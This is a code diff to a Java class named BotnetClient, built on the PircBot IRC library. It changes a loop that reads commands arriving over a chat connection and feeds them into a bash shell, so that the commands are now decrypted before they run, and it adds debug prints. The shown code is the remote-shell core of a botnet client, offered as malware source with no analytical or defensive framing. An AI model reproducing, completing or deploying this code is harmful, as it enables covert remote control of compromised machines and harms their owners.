@@ -307,16 +307,18 @@ public class BotnetClient extends PircBot {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
 		    	// TODO: make decrypted
-	    		//String encCommand = chat.readLine();
-	    		//String command = startMsgE.decryptMsg(encCommand);
-	    		String command = chat.readLine();
+	    		String encCommand = chat.readLine();
+	    		String command = startMsgE.decryptMsg(encCommand);
+	    		System.out.println(encCommand);
+	    		System.out.println(command);
+	    		//String command = chat.readLine();
 	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		command = chat.readLine();
-	        		//encCommand = chat.readLine();
-	        		//command = startMsgE.decryptMsg(encCommand);
+	        		//command = chat.readLine();
+	        		encCommand = chat.readLine();
+	        		command = startMsgE.decryptMsg(encCommand);
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
